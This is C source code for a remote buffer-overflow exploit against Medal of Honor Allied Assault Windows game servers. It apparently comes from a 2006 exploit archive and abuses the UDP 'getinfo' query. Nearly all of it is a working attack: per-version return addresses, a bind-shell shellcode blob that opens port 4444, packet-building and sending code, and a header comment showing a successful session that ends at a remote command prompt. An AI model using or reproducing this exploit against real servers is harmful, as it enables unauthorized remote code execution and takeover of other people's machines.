/*
MOHAA Win32 Server Buffer-Overflow Exploit (getinfo)
Written by RunningBon

Please use this responsibly, as I am not responsible for any damage you cause by using it.

IRC: irc.rizon.net #kik
E-mail: runningbon@gmail.com

Thanks to: Luigi Auriemma, Metasploit, everyone else (You know who you are.)

Example:

C:\>MOHAAExploit.exe 192.168.2.44 12203 MOHAA-v1.11
MoHAA Server Buffer overflow exploit
Written by RunningBon
E-Mail: runningbon@gmail.com
IRC: irc.rizon.net #kik

Attempting to exploit 192.168.2.44:12203, running version MOHAA-v1.11.
Building packet.
Sending packet.
Packet sent.
Check for your shell on port 4444.

C:\>telnet 192.168.2.44 4444
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Program Files\EA GAMES\MOHAA>
*/
#include <stdio.h>
#include <windows.h>

struct VersionStruct {
    char *pName;
    DWORD dwNewEIP;
    DWORD dwFillLength;
};

VersionStruct Versions[] = {
    "MOHAA-v1.11", 0xCBB935, 516,
    "MOHAA:S-v2.15", 0x923575, 516,
    //Add MOHAA:Breakthrough support
};

#pragma comment (lib, "ws2_32.lib")

//Port 4444 bindshell
unsigned char szShellcode[] =
"\x2b\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x42"
"\xec\xee\x81\x83\xeb\xfc\xe2\xf4\xbe\x86\x05\xcc\xaa\x15\x11\x7e"
"\xbd\x8c\x65\xed\x66\xc8\x65\xc4\x7e\x67\x92\x84\x3a\xed\x01\x0a"
"\x0d\xf4\x65\xde\x62\xed\x05\xc8\xc9\xd8\x65\x80\xac\xdd\x2e\x18"
"\xee\x68\x2e\xf5\x45\x2d\x24\x8c\x43\x2e\x05\x75\x79\xb8\xca\xa9"
"\x37\x09\x65\xde\x66\xed\x05\xe7\xc9\xe0\xa5\x0a\x1d\xf0\xef\x6a"
"\x41\xc0\x65\x08\x2e\xc8\xf2\xe0\x81\xdd\x35\xe5\xc9\xaf\xde\x0a"
"\x02\xe0\x65\xf1\x5e\x41\x65\xc1\x4a\xb2\x86\x0f\x0c\xe2\x02\xd1"
"\xbd\x3a\x88\xd2\x24\x84\xdd\xb3\x2a\x9b\x9d\xb3\x1d\xb8\x11\x51"
"\x2a\x27\x03\x7d\x79\xbc\x11\x57\x1d\x65\x0b\xe7\xc3\x01\xe6\x83"
"\x17\x86\xec\x7e\x92\x84\x37\x88\xb7\x41\xb9\x7e\x94\xbf\xbd\xd2"
"\x11\xbf\xad\xd2\x01\xbf\x11\x51\x24\x84\xff\xdd\x24\xbf\x67\x60"
"\xd7\x84\x4a\x9b\x32\x2b\xb9\x7e\x94\x86\xfe\xd0\x17\x13\x3e\xe9"
"\xe6\x41\xc0\x68\x15\x13\x38\xd2\x17\x13\x3e\xe9\xa7\xa5\x68\xc8"
"\x15\x13\x38\xd1\x16\xb8\xbb\x7e\x92\x7f\x86\x66\x3b\x2a\x97\xd6"
"\xbd\x3a\xbb\x7e\x92\x8a\x84\xe5\x24\x84\x8d\xec\xcb\x09\x84\xd1"
"\x1b\xc5\x22\x08\xa5\x86\xaa\x08\xa0\xdd\x2e\x72\xe8\x12\xac\xac"
"\xbc\xae\xc2\x12\xcf\x96\xd6\x2a\xe9\x47\x86\xf3\xbc\x5f\xf8\x7e"
"\x37\xa8\x11\x57\x19\xbb\xbc\xd0\x13\xbd\x84\x80\x13\xbd\xbb\xd0"
"\xbd\x3c\x86\x2c\x9b\xe9\x20\xd2\xbd\x3a\x84\x7e\xbd\xdb\x11\x51"
"\xc9\xbb\x12\x02\x86\x88\x11\x57\x10\x13\x3e\xe9\xb2\x66\xea\xde"
"\x11\x13\x38\x7e\x92\xec\xee\x81";

void Error(char *pString)
{
    printf("[ERROR] %s\n", pString);
    ExitProcess(0);
}

int Exploit(char *pIP, int iPort, VersionStruct *pVersion)
{
    WSAData WSADATA;
    SOCKET Socket = NULL;
    sockaddr_in SockAddr;
    char szHeader[] = "\xff\xff\xff\xff\x02getinfo ";
    char szBuffer[4096];
    int iLen = 0;

    WSAStartup(MAKEWORD(1, 1), &WSADATA);

    if((Socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == SOCKET_ERROR)
    {
        Error("socket()");
        return 0;
    }

    SockAddr.sin_addr.s_addr = inet_addr(pIP);
    SockAddr.sin_port = htons(iPort);
    SockAddr.sin_family = AF_INET;

    printf("Building packet.\n");

    memset(szBuffer, 0, sizeof(szBuffer));

    memcpy(szBuffer, szHeader, sizeof(szHeader) - 1);
    iLen += sizeof(szHeader) - 1;

    memset(szBuffer + iLen, 'z', pVersion->dwFillLength);
    iLen += pVersion->dwFillLength;

    memcpy(szBuffer + iLen, (LPVOID)&pVersion->dwNewEIP, sizeof(DWORD));
    iLen += sizeof(DWORD);

    memcpy(szBuffer + iLen, szShellcode, sizeof(szShellcode));
    iLen += sizeof(szShellcode);

    printf("Sending packet.\n");

    if(sendto(Socket, szBuffer, iLen, 0, (sockaddr*)&SockAddr, sizeof(SockAddr)) == SOCKET_ERROR)
    {
        Error("sendto()");
        return 0;
    }

    printf("Packet sent.\n");

    return 1;
}

void PrintWelcome()
{
    printf(
    "MoHAA Server Buffer overflow exploit\n"
    "Written by RunningBon\n"
    "E-Mail: runningbon@gmail.com\n"
    "IRC: irc.rizon.net #kik\n"
    "\n"
    );
}

void PrintUsage(char *pPath)
{
    printf("Usage: %s <IP> <Port> <Version Name>\n\n", pPath);

    printf("Supported Version List:\n");
    for(int i = 0; i < sizeof(Versions) / sizeof(Versions[0]); i++)
    {
        printf("%s\n", Versions[i].pName);
    }
}

int main(int argc, char **argv)
{
    VersionStruct *pVersion = NULL;

    PrintWelcome();

    if(argc < 4)
    {
        PrintUsage(argv[0]);
        return 0;
    }

    for(int i = 0; i < sizeof(Versions) / sizeof(Versions[0]); i++)
    {
        if(!stricmp(argv[3], Versions[i].pName))
        {
            pVersion = &Versions[i];
            break;
        }
    }

    if(pVersion == NULL)
    {
        Error("Invalid version.");
    }

    printf("Attempting to exploit %s:%d, running version %s.\n", argv[1], atoi(argv[2]), pVersion->pName);

    if(Exploit(argv[1], atoi(argv[2]), pVersion))
    {
        printf("Check for your shell on port 4444.\n");
    }

    return 0;
}

// milw0rm.com [2006-05-10]